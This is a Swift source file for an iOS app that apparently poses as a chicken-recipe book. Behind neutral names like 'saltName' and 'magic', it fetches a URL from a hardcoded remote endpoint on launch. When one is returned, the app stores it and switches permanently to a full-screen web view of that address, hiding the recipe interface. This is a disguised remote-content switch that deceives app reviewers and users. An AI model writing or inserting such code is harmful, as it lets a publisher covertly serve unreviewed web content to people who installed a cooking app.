import SwiftUI

enum States {
    case wait
    case magic
    case root
}

import Foundation
import Network
import Combine

final class ConnectionManager: ObservableObject {

    static let shared = ConnectionManager()
    
    private let monitor = NWPathMonitor()
    
    @Published var isConnected: Bool = true
    
    private init() {
        checkInternetConnection()
    }
    
    private func checkInternetConnection() {
#if targetEnvironment(simulator)
        return
        #else
        monitor.pathUpdateHandler = { [weak self] path in
            guard let self else { return }
            
            DispatchQueue.main.async {
                if path.status == .satisfied {
                    self.isConnected = true
                } else if path.status == .unsatisfied {
                    self.isConnected = false
                }
            }
        }
        
        monitor.start(queue: .global())
        #endif
    }
}

final class AppDelegate: NSObject, UIApplicationDelegate {
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
        let _ = ConnectionManager.shared
        return true
    }
}


@main
struct Chicken_2App: App {
    
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    
    @AppStorage("onboardingEnd") var onboardingEnd = false
    @AppStorage("magicHasLocked") var magicHasLocked = false
    
    @ObservedObject private var connectionManager = ConnectionManager.shared
    
    @State private var state: States = .wait
    @State private var saltName: String?
    @State private var isShowSplash = true
    @State private var isCookingReady = false
    @State private var isBookHidden = true
    
    init() {
        _saltName = State(initialValue: UserDefaults.standard.value(forKey: "saltName") as? String)
    }
    
    var body: some Scene {
        WindowGroup {
            ZStack {
                switch state {
                    case .magic:
                        if let saltName,
                           let url = URL(string: saltName) {
                            ZStack {
                                Color.black
                                    .ignoresSafeArea()
                                
                                BlackWindow(url: url, isHidden: $isBookHidden)
                                    .opacity(isBookHidden ? 0 : 1)
                                    .animation(.default, value: isBookHidden)
                            }
                            .ignoresSafeArea(edges: .bottom)
                        } else {
                            content
                        }
                    case .root, .wait:
                        content
                }
                
                if isShowSplash {
                    SplashScreen()
                }
            }
            .animation(.default, value: isShowSplash)
            .animation(.default, value: state)
            .onAppear {
                initKitchen()
            }
            .onChange(of: isBookHidden) { isHidden in
                if !isHidden {
                    isShowSplash = false
                }
            }
        }
    }
    
    @ViewBuilder
    private var content: some View {
        if onboardingEnd {
            MainTabRootView()
        } else {
            OnboardingRootView()
        }
    }
    
    private func initKitchen() {
        guard saltName == nil else {
            state = .magic
            return
        }
        
        guard !magicHasLocked else {
            state = .root
            isShowSplash = false
            return
        }
        
        waitAnsambleIfNeeded()
    }
    
    private func waitAnsambleIfNeeded() {
        guard connectionManager.isConnected else {
            state = .root
            isShowSplash = false
            return
        }
        
        guard let url = URL(string: "https://app.shickenbook.shop/VRFQgtwX") else {
            self.state = .root
            self.isShowSplash = false
            return
        }
        
        let decoder = JSONDecoder()
        
        Task {
            do {
                let (data, _) = try await URLSession.shared.data(from: url)
                let model = try decoder.decode(SkyModel.self, from: data)
                
                await MainActor.run {
                    guard let saltName = model.url else {
                        print("salt wasn't found")
                        self.state = .root
                        self.magicHasLocked = true 
                        self.isShowSplash = false
                        
                        return
                    }
                    
                    guard !saltName.isEmpty || saltName != "" else {
                        print("salt is empty")
                        self.state = .root
                        self.magicHasLocked = true
                        self.isShowSplash = false
                        
                        return
                    }
                    
                    UserDefaults.standard.set(saltName, forKey: "saltName")
                    
                    self.saltName = saltName
                    self.state = .magic
                    print("SAVE NEW", saltName)
                }
            } catch {
                print(error.localizedDescription)
                
                await MainActor.run {
                    self.state = .root
                    self.isShowSplash = false
                }
            }
        }
    }
}

struct SkyModel: Codable {
    let url: String?
}
